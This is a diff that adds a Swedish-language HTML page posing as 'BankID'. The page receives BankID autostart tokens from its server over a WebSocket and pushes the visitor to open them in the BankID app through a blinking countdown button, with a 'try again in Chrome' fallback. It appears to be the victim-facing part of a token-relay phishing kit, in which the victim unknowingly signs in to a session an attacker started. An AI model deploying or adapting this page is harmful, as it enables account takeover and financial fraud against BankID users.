@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="sv"><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BankID</title>
+<style>
+  body{margin:0;font:16px/1.4 system-ui;background:#0d1117;color:#eee;
+       display:grid;place-items:center;height:100vh}
+  #b{padding:30px 40px;border-radius:18px;background:#1c1c1c;border:2px solid #333;
+     font-size:22px;font-weight:700;text-align:center;user-select:none}
+  #b.live{background:#1f6feb;border-color:#58a6ff;animation:p .9s infinite}
+  @keyframes p{50%{transform:scale(1.05)}}
+  #b.dead{opacity:.35}
+  small{display:block;margin-top:10px;font-weight:400;opacity:.75;font-size:14px}
+</style>
+<div id="b">Vantar...<small>tryck nar den blinkar</small></div>
+<script>
+(function () {
+  var code = location.pathname.split("/").pop();
+  var b = document.getElementById("b");
+  var link = null, tick = null;
+
+  function connect() {
+    var ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/w/" + code);
+    ws.onmessage = function (e) {
+      var m = JSON.parse(e.data);
+      if (m.type === "token") arm(m.token, m.ttl);
+      if (m.type === "expired") die();
+    };
+    ws.onclose = function () { setTimeout(connect, 2000); };
+  }
+
+  function arm(token, ttl) {
+    link = "bankid:///?autostarttoken=" + token + "&redirect=" + encodeURIComponent(location.href);
+    b.className = "live";
+    var left = ttl;
+    var draw = function () { b.innerHTML = "TRYCK HAR<small>" + left + " s</small>"; };
+    draw();
+    clearInterval(tick);
+    tick = setInterval(function () {
+      left--;
+      if (left <= 0) { clearInterval(tick); die(); return; }
+      draw();
+    }, 1000);
+  }
+
+  function die() {
+    clearInterval(tick);
+    b.className = "dead";
+    b.innerHTML = "Vantar...<small>token har gatt ut</small>";
+  }
+
+  b.onclick = function () {
+    if (!link) return;
+    location.href = link;
+    setTimeout(function () {
+      if (!document.hidden) b.innerHTML = "INGET HANDE?<small>oppna i Chrome och tryck igen</small>";
+    }, 1500);
+  };
+
+  connect();
+})();
+</script>
